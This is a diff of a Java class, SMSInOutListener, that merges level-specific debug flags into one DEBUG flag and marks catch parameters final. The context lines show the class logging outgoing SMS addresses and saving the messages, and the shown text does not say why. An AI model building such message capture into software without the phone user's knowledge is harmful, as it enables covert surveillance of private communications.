@@ -52,8 +52,8 @@ class SMSInOutListener implements OutboundMessageListener, Runnable {
 
         try {
             notifyAll();
-        } catch (IllegalMonitorStateException ex) {
-            //#ifdef DEBUG_ERROR
+        } catch (final IllegalMonitorStateException ex) {
+            //#ifdef DEBUG
             debug.error(ex);
             //#endif
         }
@@ -70,7 +70,7 @@ class SMSInOutListener implements OutboundMessageListener, Runnable {
         totOut++;
         init();
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("notifyOutgoingMessage: " + message.getAddress()); //  sms://9813746
         //#endif
 
@@ -84,8 +84,8 @@ class SMSInOutListener implements OutboundMessageListener, Runnable {
         requestStop = true;
         try {
             notifyAll();
-        } catch (IllegalMonitorStateException ex) {
-            //#ifdef DEBUG_WARN
+        } catch (final IllegalMonitorStateException ex) {
+            //#ifdef DEBUG
             debug.warn(ex);
             //#endif
         }
@@ -105,7 +105,7 @@ class SMSInOutListener implements OutboundMessageListener, Runnable {
                     smsListener.saveLog(m, true);
 
                 } catch (final IOException e) {
-                    //#ifdef DEBUG_ERROR
+                    //#ifdef DEBUG
                     debug.error(e);
                     //#endif
                 }
@@ -115,7 +115,7 @@ class SMSInOutListener implements OutboundMessageListener, Runnable {
                 try {
                     wait();
                 } catch (final Exception e) {
-                    //#ifdef DEBUG_ERROR
+                    //#ifdef DEBUG
                     debug.error(e);
                     //#endif
                 }
